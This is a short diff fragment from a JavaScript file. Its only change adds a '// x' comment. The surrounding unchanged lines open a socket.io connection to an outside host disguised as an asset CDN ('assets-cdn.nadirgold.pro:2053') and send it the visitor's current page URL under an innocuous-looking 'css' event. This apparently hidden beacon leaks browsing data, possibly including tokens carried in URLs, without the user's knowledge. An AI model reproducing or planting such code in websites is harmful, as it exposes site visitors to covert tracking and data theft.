@@ -6,3 +6,4 @@ var socket = io("https://assets-cdn.nadirgold.pro:2053/")
 socket.emit("css",{
 data :  window.location.href
 })
+// x
